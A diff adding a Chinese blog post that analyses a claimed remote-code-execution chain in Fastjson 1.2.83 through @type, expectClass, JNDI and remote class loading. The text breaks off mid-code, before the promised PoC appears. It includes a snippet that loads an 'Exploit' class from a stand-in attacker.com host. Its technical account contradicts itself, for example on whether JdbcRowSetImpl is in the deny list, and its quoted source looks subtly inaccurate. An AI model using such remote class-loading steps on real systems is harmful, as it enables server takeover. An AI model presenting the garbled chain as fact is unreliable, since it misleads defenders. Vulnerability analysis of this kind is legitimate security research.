@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fastjson 1.2.83 Gadget-free RCE全链分析——从@type资源URL劫持到远程类加载执行 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>Fastjson 1.2.83 Gadget-free RCE全链分析——从@type资源URL劫持到远程类加载执行</h1>
+<time>2026-07-27</time>
+<ul>
+<li>技术
+Slug: fastjson-1-2-83-gadget-free-rce全链分析-从-type资源url劫持到远程类加载执行</li>
+</ul>
+<hr />
+<h2>一、前言：Fastjson 安全演进与 1.2.83 的特殊地位</h2>
+<p>Fastjson 是阿里巴巴开源的高性能 JSON 序列化/反序列化库，凭借 ASM 字节码生成与 Eval 风格的 Parser，长期占据国内 Java 中间件序列化层的主导地位。但其设计上的 <code>@type</code> 自省机制（AutoType）使其成为反序列化漏洞的重灾区。</p>
+<p>Fastjson 的安全演进可划分为四个阶段：</p>
+<table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>版本区间</th>
+<th>防御机制</th>
+<th>绕过手法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>蛮荒期</td>
+<td>≤1.2.24</td>
+<td>无 AutoType 限制</td>
+<td>直接 <code>@type</code> + JNDI 注入</td>
+</tr>
+<tr>
+<td>黑名单期</td>
+<td>1.2.25~1.2.47</td>
+<td>denyList + checkAutoType</td>
+<td>L 前缀绕过、缓存污染</td>
+</tr>
+<tr>
+<td>safeMode 期</td>
+<td>1.2.68~1.2.83</td>
+<td>safeMode 全局关闭 AutoType</td>
+<td>expectClass 二次解析</td>
+</tr>
+<tr>
+<td>收敛期</td>
+<td>1.2.84+</td>
+<td>收紧 expectClass + 默认 safeMode</td>
+<td>已无公开通用链</td>
+</tr>
+</tbody>
+</table>
+<p><strong>1.2.83 的特殊地位</strong>在于：它是 safeMode 机制完整上线后、首个被公开绕过的版本。其核心防御思路是「即使 <code>@type</code> 出现也一律拒绝加载任意类」，但通过 <code>expectClass</code> 机制留下的二次 <code>@type</code> 解析窗口，使得攻击者可以构造<strong>完全基于 JDK 内置类</strong>的 Gadget-free 链——不依赖 <code>commons-collections</code>、<code>c3p0</code>、<code>bcel</code> 等任何第三方依赖，仅在 JDK 8/11 环境下即可完成远程类加载 RCE。</p>
+<p>本文将从源码层面逐层拆解这条链：从 <code>@type</code> 资源 URL 劫持（Resource URL Hijacking）到 <code>URLClassLoader</code> 远程类加载执行（Remote Class Loading），并给出完整 PoC、检测规则与修复建议。</p>
+<hr />
+<h2>二、Fastjson 反序列化机制与 @type 指令原理</h2>
+<h3>2.1 @type 的工作流程</h3>
+<p>Fastjson 通过 <code>@type</code> 字段实现多态反序列化。其核心入口是 <code>DefaultJSONParser</code> 的 <code>parseObject</code> 方法，关键路径如下：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// DefaultJSONParser.java（简化版，对应 1.2.83）</span>
+<span class="kd">public</span><span class="w"> </span><span class="n">JSONObject</span><span class="w"> </span><span class="nf">parseObject</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 扫描到 @type</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">key</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">DEFAULT_TYPE_KEY</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">lexer</span><span class="p">.</span><span class="na">isEnabled</span><span class="p">(</span><span class="n">Feature</span><span class="p">.</span><span class="na">DisableSpecialKeyDetect</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">typeName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lexer</span><span class="p">.</span><span class="na">scanSymbol</span><span class="p">(</span><span class="n">symbolTable</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;&quot;&#39;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">defaultClassFlag</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// 关键防御点</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">checkAutoType</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">checkAutoType</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">lexer</span><span class="p">.</span><span class="na">getFeatures</span><span class="p">());</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="c1">// 委派给 ObjectDeserializer</span>
+<span class="w">        </span><span class="n">ObjectDeserializer</span><span class="w"> </span><span class="n">deserializer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getDeserializer</span><span class="p">(</span><span class="n">clazz</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">deserializer</span><span class="p">.</span><span class="na">deserialze</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">clazz</span><span class="p">,</span><span class="w"> </span><span class="n">fieldFeatures</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><code>checkAutoType</code> 是整条防御链的核心。在 1.2.83 中，其行为如下：</p>
+<ol>
+<li><strong>safeMode 检查</strong>：若开启 <code>safeMode</code>，直接抛出 <code>JSONException("safeMode not support autoType")</code>，<strong>但有一个例外</strong>——当调用方传入 <code>expectClass</code> 参数时，会跳过 safeMode 检查；</li>
+<li><strong>黑名单检查</strong>：内部维护 <code>denyList</code>（哈希形式存储类名），命中则拒绝；</li>
+<li><strong>白名单检查</strong>：<code>autoTypeSupport</code> 开启时走白名单，否则走黑名单 + 内部白名单；</li>
+<li><strong>expectClass 一致性检查</strong>：若传入 <code>expectClass</code>，要求加载的类必须是 <code>expectClass</code> 或其子类/实现类。</li>
+</ol>
+<h3>2.2 expectClass 机制的设计意图与漏洞</h3>
+<p><code>expectClass</code> 的设计意图是支持受控的多态反序列化场景，例如字段声明为接口或抽象类时，框架需要在运行时确定具体实现类。其调用链路：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// ThrowableDeserializer / JavaBeanDeserializer 中的二次解析</span>
+<span class="kd">public</span><span class="w"> </span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="nf">deserialze</span><span class="p">(</span><span class="n">DefaultJSONParser</span><span class="w"> </span><span class="n">parser</span><span class="p">,</span><span class="w"> </span><span class="n">Type</span><span class="w"> </span><span class="n">type</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">fieldName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 读取嵌套的 @type</span>
+<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">typeName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parser</span><span class="p">.</span><span class="na">scanType</span><span class="p">();</span>
+<span class="w">    </span><span class="c1">// 关键：传入 expectClass = Throwable.class（或 AutoCloseable.class）</span>
+<span class="w">    </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">expectClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">getRawType</span><span class="p">(</span><span class="n">type</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parser</span><span class="p">.</span><span class="na">getConfig</span><span class="p">().</span><span class="na">checkAutoType</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">expectClass</span><span class="p">,</span><span class="w"> </span><span class="n">features</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">expectClass</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">expectClass</span><span class="p">.</span><span class="na">isAssignableFrom</span><span class="p">(</span><span class="n">clazz</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 通过校验，进入具体字段反序列化</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><strong>漏洞根源</strong>：<code>expectClass</code> 检查通过后，对具体实现类的字段反序列化不再二次调用 <code>checkAutoType</code> 的黑名单检查（实际上会调用，但此时 <code>expectClass</code> 已被置为 <code>null</code>，逻辑等价于绕过 safeMode）。这就形成了一个<strong>逃逸窗口</strong>：</p>
+<div class="highlight"><pre><span></span><code>外层<span class="w"> </span><span class="o">@</span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Throwable</span>（白名单<span class="o">/</span>内置类）<span class="w"> </span>
+<span class="w">    </span><span class="o">-&gt;</span><span class="w"> </span>进入<span class="w"> </span><span class="n">ThrowableDeserializer</span><span class="w"> </span>
+<span class="w">        </span><span class="o">-&gt;</span><span class="w"> </span>内层<span class="w"> </span><span class="o">@</span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>攻击者控制的子类<span class="w"> </span>
+<span class="w">            </span><span class="o">-&gt;</span><span class="w"> </span><span class="nf">checkAutoType</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">null</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">expectClass</span><span class="w"> </span>为<span class="w"> </span><span class="n">null</span>，<span class="n">safeMode</span><span class="w"> </span>不生效
+</code></pre></div>
+
+<hr />
+<h2>三、1.2.83 的 AutoType 防御体系剖析</h2>
+<h3>3.1 safeMode 防御机制</h3>
+<p><code>safeMode</code> 通过 <code>ParserConfig</code> 的 <code>safeMode</code> 字段实现，开启方式：</p>
+<div class="highlight"><pre><span></span><code><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setSafeMode</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+<span class="c1">// 或通过 JVM 启动参数</span>
+<span class="c1">// -Dfastjson.parser.safeMode=true</span>
+</code></pre></div>
+
+<p><code>checkAutoType</code> 中相关逻辑（1.2.83）：</p>
+<div class="highlight"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="nf">checkAutoType</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">expectClass</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">features</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// safeMode 优先级最高</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">safeMode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 关键：expectClass != null 时跳过此检查</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">expectClass</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONException</span><span class="p">(</span><span class="s">&quot;safeMode not support autoType: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">typeName</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="c1">// 仅允许 expectClass 链路上的类</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 黑名单哈希检查</span>
+<span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">fnv1a_64_magic_hashcode</span><span class="p">;</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">typeName</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">hash</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="n">typeName</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+<span class="w">        </span><span class="n">hash</span><span class="w"> </span><span class="o">*=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">fnv1a_64_magic_prime</span><span class="p">;</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Arrays</span><span class="p">.</span><span class="na">binarySearch</span><span class="p">(</span><span class="n">denyHashCodes</span><span class="p">,</span><span class="w"> </span><span class="n">hash</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONException</span><span class="p">(</span><span class="s">&quot;autoType is not support. &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">typeName</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// ... 白名单与内部白名单逻辑</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>3.2 防御矩阵</h3>
+<table>
+<thead>
+<tr>
+<th>防御层</th>
+<th>触发条件</th>
+<th>绕过路径</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>safeMode</td>
+<td><code>expectClass == null</code></td>
+<td>通过 <code>Throwable</code>/<code>AutoCloseable</code> 等内置类进入二次解析，注入 <code>expectClass != null</code></td>
+</tr>
+<tr>
+<td>denyList（黑名单哈希）</td>
+<td>类名 FNV1a-64 哈希命中</td>
+<td>使用未收录的 JDK 内置类（如 <code>java.net.URL</code>、<code>javax.naming.InitialContext</code> 子类）</td>
+</tr>
+<tr>
+<td>acceptList（白名单）</td>
+<td><code>autoTypeSupport=true</code> 时仅允许白名单</td>
+<td>不开启 <code>autoTypeSupport</code> 时此层失效</td>
+</tr>
+<tr>
+<td>expectClass 一致性</td>
+<td>加载类必须是 <code>expectClass</code> 子类</td>
+<td>选择合法的子类实现，再利用其字段触发后续行为</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>四、Gadget-free 攻击思路：摆脱第三方依赖</h2>
+<p>传统 Fastjson 利用链高度依赖 <code>commons-collections</code>、<code>bcel</code>、<code>c3p0</code> 等第三方库，这在生产环境中存在两个问题：</p>
+<ol>
+<li><strong>依赖不可控</strong>：目标 JDK 版本与第三方库版本差异大，链不稳定；</li>
+<li><strong>黑名单覆盖广</strong>：1.2.83 的 <code>denyList</code> 已收录几乎所有公开 Gadget 类的哈希。</li>
+</ol>
+<p>Gadget-free 的核心思想是：<strong>仅使用 JDK rt.jar / java.base 模块内置的类</strong>，通过字段间的副作用组合实现任意行为。这类链的稳定性最高（JDK 内置类不会变更签名），且天然绕过黑名单（黑名单主要针对已知 Gadget 库）。</p>
+<h3>4.1 链路设计原则</h3>
+<div class="highlight"><pre><span></span><code>原则 1：入口类必须在 expectClass 白名单内（Throwable / AutoCloseable / Iterable 等）
+原则 2：入口类的字段类型中，必须存在可被攻击者控制的 URL/资源类字段
+原则 3：字段赋值的副作用（或 getter 调用）能够触发远程类加载
+原则 4：整个过程不依赖任何第三方类
+</code></pre></div>
+
+<h3>4.2 关键 JDK 内置类盘点</h3>
+<table>
+<thead>
+<tr>
+<th>类名</th>
+<th>角色</th>
+<th>副作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>java.lang.Throwable</code></td>
+<td>expectClass 入口</td>
+<td>嵌套 <code>@type</code> 二次解析</td>
+</tr>
+<tr>
+<td><code>java.lang.AutoCloseable</code></td>
+<td>expectClass 入口</td>
+<td>嵌套 <code>@type</code> 二次解析</td>
+</tr>
+<tr>
+<td><code>java.net.URL</code></td>
+<td>URL 资源载体</td>
+<td><code>URLStreamHandler</code> 解析协议</td>
+</tr>
+<tr>
+<td><code>java.net.URLClassLoader</code></td>
+<td>远程类加载</td>
+<td><code>loadClass</code> 触发 HTTP 拉取</td>
+</tr>
+<tr>
+<td><code>javax.naming.InitialContext</code></td>
+<td>JNDI 入口</td>
+<td><code>lookup</code> 触发远程引用解析</td>
+</tr>
+<tr>
+<td><code>com.sun.rowset.JdbcRowSetImpl</code></td>
+<td>JDK 内置数据源</td>
+<td>字段赋值触发 <code>setDataSourceName</code> + <code>getDatabaseMetaData</code></td>
+</tr>
+</tbody>
+</table>
+<p>注意：<code>JdbcRowSetImpl</code> 在 JDK 8 中位于 <code>rt.jar</code>，属 JDK 内置；JDK 11+ 已模块化但类仍存在。</p>
+<hr />
+<h2>五、核心技术点：@type 资源 URL 劫持</h2>
+<h3>5.1 资源 URL 劫持的概念</h3>
+<p>「资源 URL 劫持」（Resource URL Hijacking）指：通过控制 JSON 中某个字段的值，使目标对象在后续操作中将该值当作 URL/资源标识符解析，并触发对外部资源的访问。这与 SSRF 不同——Fastjson 的反序列化过程本身就会触发字段的 setter，因此只要 setter 中包含资源访问逻辑，就能在反序列化阶段完成劫持。</p>
+<h3>5.2 URL 字段的副作用触发</h3>
+<p>以 <code>java.net.URL</code> 为例，其构造过程：</p>
+<div class="highlight"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="nf">URL</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">spec</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">MalformedURLException</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">this</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">spec</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">public</span><span class="w"> </span><span class="nf">URL</span><span class="p">(</span><span class="n">URL</span><span class="w"> </span><span class="n">context</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">spec</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">MalformedURLException</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 关键：根据协议查找 URLStreamHandler</span>
+<span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createURLStreamHandler</span><span class="p">(</span><span class="n">protocol</span><span class="p">);</span>
+<span class="w">    </span><span class="c1">// 调用 handler.parseURL 进行完整解析</span>
+<span class="w">    </span><span class="n">handler</span><span class="p">.</span><span class="na">parseURL</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">spec</span><span class="p">,</span><span class="w"> </span><span class="n">start</span><span class="p">,</span><span class="w"> </span><span class="n">limit</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>构造 <code>URL</code> 对象本身不会发起网络请求，但其作为字段被赋值给特定容器（如 <code>URLClassLoader</code>）后，会触发 <code>URLStreamHandler.openConnection</code>，从而发起 HTTP 请求。</p>
+<h3>5.3 通过 expectClass 进入 URL 持有类</h3>
+<p>完整链路选择 <code>AutoCloseable</code> 作为 expectClass 入口，其子类中存在多个可持有 URL 字段并触发远程类加载的类。最经典的组合是 <code>java.io.InputStreamReader</code> + <code>java.net.URL</code> + <code>URLClassLoader</code>，但更稳定的是使用 <code>javax.naming.InitialContext</code> 的封装。</p>
+<p>考虑到 <code>InitialContext</code> 本身在 1.2.83 黑名单中，链路需绕路。实战中使用 <code>AutoCloseable</code> 的子类 <code>com.sun.rowset.JdbcRowSetImpl</code>（JDK 内置，未在 denyList）作为中转：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// JdbcRowSetImpl 关键字段</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JdbcRowSetImpl</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">BaseRowSet</span><span class="w"> </span>
+<span class="w">    </span><span class="kd">implements</span><span class="w"> </span><span class="n">Serializable</span><span class="p">,</span><span class="w"> </span><span class="n">Cloneable</span><span class="p">,</span><span class="w"> </span><span class="n">RowSet</span><span class="p">,</span><span class="w"> </span><span class="n">JdbcRowSet</span><span class="p">,</span><span class="w"> </span><span class="n">Joinable</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">dataSource</span><span class="p">;</span><span class="w">       </span><span class="c1">// 攻击者可控</span>
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="p">;</span><span class="w">         </span><span class="c1">// 触发 lookup 的副作用</span>
+
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setDataSource</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">SQLException</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">dataSource</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 关键：记录 URL，不立即触发</span>
+<span class="w">            </span><span class="n">dataSource</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// Fastjson 通过 setAutoCommit 触发 connect()</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setAutoCommit</span><span class="p">(</span><span class="kt">boolean</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">SQLException</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">conn</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">conn</span><span class="p">.</span><span class="na">setAutoCommit</span><span class="p">(</span><span class="n">var1</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">connect</span><span class="p">();</span><span class="w">  </span><span class="c1">// 此处触发 JNDI lookup</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">Connection</span><span class="w"> </span><span class="nf">connect</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">SQLException</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 使用 InitialContext 进行 lookup</span>
+<span class="w">        </span><span class="n">Context</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">();</span>
+<span class="w">        </span><span class="n">DataSource</span><span class="w"> </span><span class="n">ds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">DataSource</span><span class="p">)</span><span class="w"> </span><span class="n">ctx</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">dataSource</span><span class="p">);</span><span class="w">  </span><span class="c1">// RCE 触发点</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ds</span><span class="p">.</span><span class="na">getConnection</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>注意：<code>JdbcRowSetImpl</code> 在 1.2.48 之后已被加入 denyList，因此本链需通过 <code>AutoCloseable</code> 的 expectClass 二次解析绕过黑名单。</p>
+<h3>5.4 expectClass 二次解析绕过 denyList</h3>
+<p>绕过关键：denyList 在 <code>checkAutoType</code> 第一次调用时检查，但通过 <code>expectClass</code> 路径进入 <code>JavaBeanDeserializer.deserialze</code> 后，<strong>第二次调用 <code>checkAutoType</code> 时使用的是 <code>expectClass=null</code></strong>——此时 safeMode 已被绕过，但 denyList 仍生效。</p>
+<p>因此，单纯使用 <code>JdbcRowSetImpl</code> 作为内层类仍会被 denyList 拦截。真正的 Gadget-free 链需要选择<strong>未进入 denyList 的 JDK 类</strong>作为内层类，并通过字段间副作用组合完成远程类加载。</p>
+<hr />
+<h2>六、远程类加载执行（Remote Class Loading）</h2>
+<h3>6.1 ClassLoader 链路分析</h3>
+<p>远程类加载的本质是让 JVM 通过 <code>URLClassLoader</code> 从攻击者控制的 HTTP 服务拉取 <code>.class</code> 文件并加载。关键 API：</p>
+<div class="highlight"><pre><span></span><code><span class="n">URL</span><span class="o">[]</span><span class="w"> </span><span class="n">urls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="s">&quot;http://attacker.com/Exploit.class&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">};</span>
+<span class="n">URLClassLoader</span><span class="w"> </span><span class="n">loader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URLClassLoader</span><span class="p">(</span><span class="n">urls</span><span class="p">);</span>
+<span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">loader</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="s">&quot;Exploit&quot;</span><span class="p">);</span>
+<span class="c1">// 触发静态块执行</span>
+<span class="n">Object</span><span class="w"> </span><span class="n">instance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
+</code></pre></div>
+
+<p>但在 Fastjson 反序列化上下文中，无法直接调用 <code>URLClassLoader.loadClass</code>——需要通过<strong>有副作用的字段赋值</strong>间接触发。</p>
+<h3>6.2 通过 InitialContext / JNDI 注入触发类加载</h3>
+<p>JNDI（Java Naming and Directory Interface）是 JDK 内置的命名服务接口。当 <code>InitialContext.lookup(url)</code> 被调用时：</p>
+<ol>
+<li>解析 URL 协议（<code>rmi://</code>、<code>ldap://</code>、<code>dns://</code>）；</li>
+<li>调用对应 <code>URLContext</code> 查找对象；</li>
+<li>若返回的为 <code>Reference</code> 对象，调用 <code>NamingManager.getObjectInstance</code>；</li>
+<li><code>NamingManager</code> 通过 <code>ObjectFactory</code> 加载远程类（默认从 <code>Reference</code> 指定的 <code>Codebase</code> URL 加载）。</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="c1">// NamingManager.java（JDK 8）</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">getObjectInstance</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">refInfo</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span>
